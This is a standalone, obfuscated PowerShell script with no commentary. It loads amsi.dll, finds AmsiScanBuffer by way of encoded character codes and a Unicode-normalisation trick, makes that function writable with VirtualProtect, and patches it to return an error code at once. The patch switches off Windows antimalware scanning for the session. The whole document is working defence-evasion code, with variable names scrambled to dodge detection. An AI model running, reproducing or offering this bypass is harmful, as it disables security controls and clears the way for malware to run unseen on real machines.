$yvNr = @"
using System;
using System.Runtime.InteropServices;
public class yvNr {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr pGcX, string D2whfpbUnuLNo8A);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr ajyHPM5lHmtHV, UIntPtr CMS82KYuXRmYp, uint ERk2G2Pt, out uint cNxpdGpF);
}
"@

Add-Type $yvNr

$Lp_ = [yvNr]::LoadLibrary("$([cHAr](97+56-56)+[cHaR]([bytE]0x6d)+[CHAr]([bYte]0x73)+[cHaR](105+50-50)+[chaR](39+7)+[char](100*44/44)+[cHaR]([BytE]0x6c)+[Char](108*25/25))")
$NulyYat9tT8 = [yvNr]::GetProcAddress($Lp_, "$(('ÀmsìScãnBù'+'ffêr').nORMAlizE([cHAR]([byte]0x46)+[CHAR](71+40)+[cHar](114+89-89)+[char]([bYTE]0x6d)+[ChaR](68)) -replace [cHAr]([byte]0x5c)+[chaR](112)+[ChAr](123)+[cHAR]([BytE]0x4d)+[ChAr](110)+[CHAr](125))")
$p = 0
[yvNr]::VirtualProtect($NulyYat9tT8, [uint32]5, 0x40, [ref]$p)
$QRxJ7mFmqD6e6F = "0xB8"
$tQM = "0x57"
$aCw94b8DaXytDn_j = "0x00"
$mRw8P1xY1 = "0x07"
$thaY = "0x80"
$QBtH2aIxz9SnwGa = "0xC3"
$wflusEVeccMH = [Byte[]] ($QRxJ7mFmqD6e6F,$tQM,$aCw94b8DaXytDn_j,$mRw8P1xY1,+$thaY,+$QBtH2aIxz9SnwGa)
[System.Runtime.InteropServices.Marshal]::Copy($wflusEVeccMH, 0, $NulyYat9tT8, 6)